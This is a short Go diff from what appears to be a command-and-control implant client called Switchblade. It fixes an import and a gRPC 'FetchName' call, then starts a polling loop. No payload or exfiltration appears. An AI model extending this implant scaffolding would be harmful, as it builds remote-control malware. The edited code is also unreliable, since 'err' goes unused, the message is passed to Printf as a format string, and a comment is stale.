@@ -13,7 +13,7 @@ import (
 	"strings"
 	"time"
 
-	"github.com/matt-culbert/Switchblade/grpcapi"
+	grpcapi "server/grpcapi"
 	"google.golang.org/grpc"
 	"google.golang.org/grpc/credentials"
 )
@@ -69,9 +69,10 @@ func main() {
 	ctx := context.Background()
 
 	client = grpcapi.NewImplantClient(conn)
-	
+
 	var test = new(grpcapi.Empty)
-	client.fetchName(ctx, test) // RegisterImplant is defined in proto as taking in a string and has no output
+	name, err := client.FetchName(ctx, test) // RegisterImplant is defined in proto as taking in a string and has no output
+	log.Printf(name)
 
 	for {
 		var req = new(grpcapi.Empty)
